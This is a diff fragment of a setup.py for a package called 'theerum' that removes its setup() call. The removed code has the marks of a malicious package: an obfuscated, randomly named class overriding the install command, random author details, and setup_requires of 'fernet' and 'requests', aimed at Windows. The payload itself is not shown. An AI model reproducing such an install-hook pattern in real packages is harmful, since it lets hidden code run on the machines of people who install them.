@@ -18,22 +18,5 @@ class iTmyyDUFbhxEIxQwdBOFMbfmvfWhJEXvFObTGyqCvwkxcuLoDTrKtugZHtfSZJathVcATMBGWc
             install.run(self)
 
 
-setup(
-    name="theerum",
-    version=VERSION,
-    author="wHIXSUKcTlHm",
-    author_email="sZLhOppnQogKuxcftOFp@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': iTmyyDUFbhxEIxQwdBOFMbfmvfWhJEXvFObTGyqCvwkxcuLoDTrKtugZHtfSZJathVcATMBGWcctMrpgSOKSabedNItrsBmylUgNmnbfEATKFNHMBqSjtrrxEMnAJoLMTPZT,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
 
